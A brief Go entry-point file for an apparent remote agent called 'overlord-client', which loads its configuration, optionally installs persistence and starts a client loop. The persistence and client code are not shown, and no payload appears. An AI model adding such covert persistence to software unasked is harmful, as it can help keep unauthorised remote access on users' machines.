package main

import (
	"log"
	"overlord-client/cmd/agent/config"
	"overlord-client/cmd/agent/persistence"
)

func main() {
	cfg := config.Load()

	if cfg.EnablePersistence {
		if err := persistence.Setup(); err != nil {
			log.Printf("Warning: Failed to setup persistence: %v", err)
		}
	}

	runClient(cfg)
}
